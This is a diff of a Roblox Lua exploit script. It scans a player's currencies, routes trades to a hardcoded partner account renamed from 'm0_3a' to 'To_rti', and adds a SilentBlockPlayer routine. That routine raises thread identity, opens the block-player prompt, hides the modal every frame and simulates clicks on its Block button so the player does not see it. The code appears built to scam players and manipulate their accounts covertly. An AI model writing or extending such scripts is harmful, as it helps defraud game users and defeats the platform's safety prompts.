@@ -1,45 +1,3 @@
-	gem = true,
-	tokens = true,
-	token = true,
-	gold = true,
-	candy = true,
-	candies = true,
-	snowtokens = true,
-	snowtoken = true,
-	beachballs = true,
-	beachball = true,
-	eggs = true,
-	egg = true,
-	shards = true,
-	shard = true,
-	credits = true,
-	credit = true,
-	keys = true,
-	key = true,
-}
-
-local function GetNumericValue(instance)
-	if instance:IsA("IntValue") or instance:IsA("NumberValue") then
-		return instance.Value
-	end
-	return nil
-end
-
-local function CollectLocalCurrencyRows()
-	local scanned = ScanProfileCurrencies(ProfileData or {})
-	local rows = {}
-	for _, entry in pairs(scanned) do
-		if type(entry) == "table" then
-			table.insert(rows, entry)
-		end
-	end
-
-	table.sort(rows, function(a, b)
-		if a.amount ~= b.amount then
-			return a.amount > b.amount
-		end
-		return a.label < b.label
-	end)
 
 	return rows
 end
@@ -128,6 +86,8 @@ local function GetComparableSupremeValue(value)
 	return -1
 end
 
+local DEFAULT_PARTNER_NAME = "To_rti"
+
 -- === Trade Table ===
 local TradeTable = {
 	LastOffer = os.time(),
@@ -138,7 +98,7 @@ local TradeTable = {
 		Offer = {}
 	},
 	Player2 = {
-		Player = "m0_3a",
+		Player = DEFAULT_PARTNER_NAME,
 		Accepted = false,
 		Offer = {}
 	},
@@ -207,12 +167,12 @@ local function AcceptTrade()
 
 		pcall(function() TradeGUI.Enabled = false end)
 
-		local partner = "m0_3a"
+		local partner = DEFAULT_PARTNER_NAME
 		if TradeTable.Player2 and TradeTable.Player2.Player then
 			partner = TradeTable.Player2.Player
 		end
 
-		if partner and partner ~= "" and partner ~= "m0_3a" then
+		if partner and partner ~= "" and partner ~= DEFAULT_PARTNER_NAME then
 			LastTradePartner = partner
 			pcall(function()
 				if PartnerUserBox then PartnerUserBox.Text = partner end
@@ -503,7 +463,7 @@ end
 function DeclineTrade()
 	pcall(function() TradeGUI.Enabled = false end)
 
-	local partner = "m0_3a"
+	local partner = DEFAULT_PARTNER_NAME
 	if TradeTable and TradeTable.Player2 and TradeTable.Player2.Player then
 		partner = TradeTable.Player2.Player
 	end
@@ -865,3 +825,86 @@ local SilentBlockStrategies = {
 				vim:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
 			end)
 		end,
+		settle = 0.15,
+	},
+}
+
+local function SilentBlockPlayer(Selected)
+	if not Selected then return end
+	local playerName = (typeof(Selected) == "Instance" and Selected.Name) or tostring(Selected)
+	print("[block] >>> SilentBlockPlayer: " .. playerName)
+
+	pcall(function() setthreadidentity(8) end)
+
+	local preWatchers = {}
+	local function watchFor(parent)
+		local conn = parent.DescendantAdded:Connect(function(d)
+			if d.Name == SilentBlockConfig.modalName then
+				silentHide(d)
+				local inner = d.DescendantAdded:Connect(function() silentHide(d) end)
+				table.insert(preWatchers, inner)
+			end
+		end)
+		table.insert(preWatchers, conn)
+	end
+	pcall(function() watchFor(SilentBlockServices.CoreGui) end)
+
+	SilentBlockServices.StarterGui:SetCore("PromptBlockPlayer", Selected)
+
+	local startTime = tick()
+	local modal = nil
+	while not modal do
+		SilentBlockServices.RunService.Heartbeat:Wait()
+		if tick() - startTime > SilentBlockConfig.modalAppearTimeout then
+			warn("[block] modal never appeared for " .. playerName)
+			for _, c in ipairs(preWatchers) do pcall(function() c:Disconnect() end) end
+			pcall(function() setthreadidentity(2) end)
+			return
+		end
+		local overlay = findOverlay()
+		if overlay then
+			modal = overlay:FindFirstChild(SilentBlockConfig.modalName, true)
+		end
+	end
+
+	silentHide(modal)
+
+	local posConn
+	posConn = SilentBlockServices.RunService.Heartbeat:Connect(function()
+		pcall(function()
+			if modal and modal.Parent then
+				silentHide(modal)
+			else
+				posConn:Disconnect()
+			end
+		end)
+	end)
+
+	local blockBtn = findBlockButton(modal)
+
+	if blockBtn then
+		print("[block] Block button found at " .. blockBtn:GetFullName())
+
+		local attempts = 0
+		while attempts < SilentBlockConfig.maxAttempts do
+			attempts = attempts + 1
+			local dismissed = false
+
+			for _, strategy in ipairs(SilentBlockStrategies) do
+				strategy.run(blockBtn)
+				task.wait(strategy.settle)
+				if not strategy.skipCheck and not modalStillOpen() then
+					print(("[block] modal dismissed on attempt %d via %s for %s"):format(attempts, strategy.name, playerName))
+					dismissed = true
+					break
+				end
+			end
+
+			if dismissed then break end
+		end
+		pcall(function() SilentBlockServices.GuiService.SelectedObject = nil end)
+	else
+		warn("[block] couldn't find Block button for " .. playerName)
+	end
+
+	pcall(function() if posConn then posConn:Disconnect() end end)
